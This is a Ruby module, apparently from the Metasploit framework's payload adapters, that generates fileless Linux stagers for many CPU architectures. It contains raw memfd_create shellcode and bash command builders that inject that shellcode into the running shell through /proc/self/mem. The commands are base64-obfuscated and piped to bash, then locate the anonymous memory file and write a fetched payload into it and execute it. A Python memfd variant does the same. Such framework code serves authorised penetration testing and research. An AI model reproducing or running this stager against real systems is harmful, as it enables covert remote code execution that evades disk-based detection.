module Msf::Payload::Adapter::Fetch::Fileless
  
  def _generate_first_stage_shellcode(arch)
    case arch
    when 'x64'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm = %(
      start:
          xor rsi, rsi
          push rsi
          push rsp
          pop rdi
          mov rax, 0xfffffffffffffec1 
          neg rax
          syscall
          mov rdi,rax
          mov al, 0x4d
          syscall
          push 0x22
          pop rax
          syscall

      )
      payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
    when 'x86'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm= %(
        xor ecx, ecx
        push ecx
        lea ebx, [esp]
        inc ecx
        mov eax, 0xfffffe9c
        neg eax
        int 0x80
        mov ebx, eax
        mov al, 0x5d
        int 0x80
        mov al, 0x1d
        int 0x80
      )
      payload = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
    when 'aarch64'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pid = getpid()
      # kill(pid,SIGSTOP)
      in_memory_loader_asm = [
          0x000080d2, #0x1000:	mov	x0, #0	0x000080d2
          0xe00f1ff8, #0x1004:	str	x0, [sp, #-0x10]!	0xe00f1ff8
          0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
          0x210001ca, #0x100c:	eor	x1, x1, x1	0x210001ca
          0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
          0x010000d4, #0x1014:	svc	#0	0x010000d4
          0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
          0x010000d4, #0x101c:	svc	#0	0x010000d4
          0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
          0x010000d4, #0x1024:	svc	#0	0x010000d4
          0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
          0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
          0x010000d4, #0x1030:	svc	#0	0x010000d4

      ]
      payload = in_memory_loader_asm.pack("N*")
    when 'armle'
      in_memory_loader_asm = [
          0x4ff00002, #0x1000:	mov.w	r2, #0	0x4ff00002
          0x4df8042d, #0x1004:	str	r2, [sp, #-0x4]!	0x4df8042d
          0x6846, #0x1008:	mov	r0, sp	0x6846
          0x4ff00101, #0x100a:	mov.w	r1, #1	0x4ff00101
          0x4ff08307, #0x100e:	mov.w	r7, #0x83	0x4ff08307
          0x07f1fe07, #0x1012:	add.w	r7, r7, #0xfe	0x07f1fe07
          0x00df, #0x1016:	svc	#0	0x00df
          0x4ff05d07, #0x1018:	mov.w	r7, #0x5d	0x4ff05d07
          0x00df, #0x101c:	svc	#0	0x00df
          0x4ff01d07, #0x101e:	mov.w	r7, #0x1d	0x4ff01d07
          0x00df, #0x1022:	svc	#0	0x00df
      ]
      payload = in_memory_loader_asm.pack("V*")
    when 'armbe'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm = [
          0xf04f0200, #0x1000:	mov.w	r2, #0	0xf04f0200
          0xf84d2d04, #0x1004:	str	r2, [sp, #-0x4]!	0xf84d2d04
          0x4668, #0x1008:	mov	r0, sp	0x4668
          0xf04f0101, #0x100a:	mov.w	r1, #1	0xf04f0101
          0xf04f0783, #0x100e:	mov.w	r7, #0x83	0xf04f0783
          0xf10707fe, #0x1012:	add.w	r7, r7, #0xfe	0xf10707fe
          0xdf00, #0x1016:	svc	#0	0xdf00
          0xf04f075d, #0x1018:	mov.w	r7, #0x5d	0xf04f075d
          0xdf00, #0x101c:	svc	#0	0xdf00
          0xf04f071d, #0x101e:	mov.w	r7, #0x1d	0xf04f071d
          0xdf00, #0x1022:	svc	#0	0xdf00
      ]
      payload = in_memory_loader_asm.pack("V*")
    when 'mips64'
      in_memory_loader_asm = [
          0xfcffa0af, #0x1000:	sw	$zero, -4($sp)	0xfcffa0af
          0xfcffbd27, #0x1004:	addiu	$sp, $sp, -4	0xfcffbd27
          0x2020a003, #0x1008:	add	$a0, $sp, $zero	0x2020a003
          0xfeff1924, #0x100c:	addiu	$t9, $zero, -2	0xfeff1924
          0x27282003, #0x1010:	not	$a1, $t9	0x27282003
          0x02110224, #0x1014:	addiu	$v0, $zero, 0x1102	0x02110224
          0x0c000000, #0x1018:	syscall		0x0c000000
          0x2528e003, #0x101c:	move	$a1, $ra	0x2528e003
          0xfd0f0224, #0x1020:	addiu	$v0, $zero, 0xffd	0xfd0f0224
          0x0c000000, #0x1024:	syscall		0x0c000000
          0xbd0f0224, #0x1028:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
          0x0c000000, #0x102c:	syscall		0x0c000000
      ]
      payload = in_memory_loader_asm.pack('V*')
    when 'mipsbe'
      in_memory_loader_asm = [
          0xafa0fffc, #0x1000:	sw	$zero, -4($sp)	0xafa0fffc
          0x27bdfffc, #0x1004:	addiu	$sp, $sp, -4	0x27bdfffc
          0x03a02020, #0x1008:	add	$a0, $sp, $zero	0x03a02020
          0x2419fffe, #0x100c:	addiu	$t9, $zero, -2	0x2419fffe
          0x03202827, #0x1010:	not	$a1, $t9	0x03202827
          0x24021102, #0x1014:	addiu	$v0, $zero, 0x1102	0x24021102
          0x0000000c, #0x1018:	syscall		0x0000000c
          0x03e02825, #0x101c:	move	$a1, $ra	0x03e02825
          0x24020ffd, #0x1020:	addiu	$v0, $zero, 0xffd	0x24020ffd
          0x0000000c, #0x1024:	syscall		0x0000000c
          0x24020fbd, #0x1028:	addiu	$v0, $zero, 0xfbd	0x24020fbd
          0x0000000c, #0x102c:	syscall		0x0000000c
      ]
      payload = in_memory_loader_asm.pack('V*')
    when 'mipsle'
      in_memory_loader_asm = [
          0xfcffa0af, #0x1000:	sw	$zero, -4($sp)	0xfcffa0af
          0xfcffbd27, #0x1004:	addiu	$sp, $sp, -4	0xfcffbd27
          0x2020a003, #0x1008:	add	$a0, $sp, $zero	0x2020a003
          0xfeff1924, #0x100c:	addiu	$t9, $zero, -2	0xfeff1924
          0x27282003, #0x1010:	not	$a1, $t9	0x27282003
          0x02110224, #0x1014:	addiu	$v0, $zero, 0x1102	0x02110224
          0x0c000000, #0x1018:	syscall		0x0c000000
          0x2528e003, #0x101c:	move	$a1, $ra	0x2528e003
          0xfd0f0224, #0x1020:	addiu	$v0, $zero, 0xffd	0xfd0f0224
          0x0c000000, #0x1024:	syscall		0x0c000000
          0xbd0f0224, #0x1028:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
          0x0c000000, #0x102c:	syscall		0x0c000000
      ]
      payload = in_memory_loader_asm.pack('V*')
    when 'ppc'
      in_memory_loader_asm = [
          0x0000c039, #0x1000:	li	r14, 0	0x0000c039
          0x0000c195, #0x1004:	stwu	r14, 0(r1)	0x0000c195
          0x780b237c, #0x1008:	mr	r3, r1	0x780b237c
          0x00008038, #0x100c:	li	r4, 0	0x00008038
          0x68010038, #0x1010:	li	r0, 0x168	0x68010038
          0x02000044, #0x1014:	sc		0x02000044
          0x5d000038, #0x1018:	li	r0, 0x5d	0x5d000038
          0x02000044, #0x101c:	sc		0x02000044
          0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
          0x02000044, #0x1024:	sc		0x02000044
      ]
      payload = in_memory_loader_asm.pack('N*')
    when 'ppc64'
      in_memory_loader_asm = [
          0x39c00000, #0x1000:	li	r14, 0	0x39c00000
          0x95c10000, #0x1004:	stwu	r14, 0(r1)	0x95c10000
          0x7c230b78, #0x1008:	mr	r3, r1	0x7c230b78
          0x38800000, #0x100c:	li	r4, 0	0x38800000
          0x38000168, #0x1010:	li	r0, 0x168	0x38000168
          0x44000002, #0x1014:	sc		0x44000002
          0x3800005d, #0x1018:	li	r0, 0x5d	0x3800005d
          0x44000002, #0x101c:	sc		0x44000002
          0x3800001d, #0x1020:	li	r0, 0x1d	0x3800001d
          0x44000002, #0x1024:	sc		0x44000002
    ]
      payload = in_memory_loader_asm.pack('N*')
    when 'ppc64le'
      in_memory_loader_asm = [
          0x0000c039, #0x1000:	li	r14, 0	0x0000c039
          0x0000c195, #0x1004:	stwu	r14, 0(r1)	0x0000c195
          0x780b237c, #0x1008:	mr	r3, r1	0x780b237c
          0x00008038, #0x100c:	li	r4, 0	0x00008038
          0x68010038, #0x1010:	li	r0, 0x168	0x68010038
          0x02000044, #0x1014:	sc		0x02000044
          0x5d000038, #0x1018:	li	r0, 0x5d	0x5d000038
          0x02000044, #0x101c:	sc		0x02000044
          0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
          0x02000044, #0x1024:	sc		0x02000044
      ]
      payload = in_memory_loader_asm.pack('N*')
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
    end
    #payload.unpack("H*")[0]
    #Base64.strict_encode64(payload).gsub(/\n/, '')
  end
 
  def _generate_jmp_instruction_sh(arch)
    case arch
      when 'x64'
        %^110270^
      else
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
    end

  end

  #bash contains extension to standard printf definition, which allows defining hexadecimal bytes with \xHH.
  def _generate_jmp_instruction_bash(arch)
    #
    # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
    
    case arch
    when 'x64'
      %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
    when 'x86'
      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
    when 'aarch64'
      %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
    when 'armle'
      %^"024a1047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
    when 'armbe'
      %^"dff800703847"$(echo $(printf %04x $vdso_addr))^
    when 'mipsle'
      %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
    when 'mipsbe'
      %^"2409"$(echo (printf %04x $vdso_addr))"0120000800000000"^
    when 'mips64'
      %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
    when 'ppc'
     %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"0038a603087c2000804e"^ 
    when 'ppc64'
      %^"3800"$(echo (printf %04x $vdso_addr))"7c0803a64e800020"^
    when 'ppc64le'
     %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"0038a603087c2000804e"^ 
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
    end
  end

  # Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
  # New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
  def _generate_fileless_bash(get_file_cmd, arch)
    stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
    stage_cmd << %(jmp=#{_generate_jmp_instruction_bash(arch)};)
    stage_cmd << %(sc='#{_generate_first_stage_shellcode(arch).unpack("H*")[0]}';)
    stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
    stage_cmd << %<sc=$(printf $sc | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
    stage_cmd << 'read syscall_info < /proc/self/syscall;'
    stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
    stage_cmd << 'exec 3>/proc/self/mem;'
    stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
    stage_cmd << 'printf $sc >&3;'
    stage_cmd << 'exec 3>&-;'
    stage_cmd << 'exec 3>/proc/self/mem;'
    stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
    stage_cmd << 'printf $jmp >&3;'

    cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | bash & "
    cmd << 'cd /proc/$!;'
    cmd << 'sleep 1;' #adding short pause to give process time to load file handle
    cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'

    cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
    cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
    cmd << "then if $(#{get_file_cmd} >/dev/null);"
    cmd << 'then $f;FOUND=1;break;'
    cmd << 'fi;'
    cmd << 'fi;'
    cmd << 'done;'
    cmd << 'fi;'
  end
  
  # same idea as _generate_fileless function, but force creating anonymous file handle
  def _generate_fileless_python(get_file_cmd)
    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'> 
  end

end

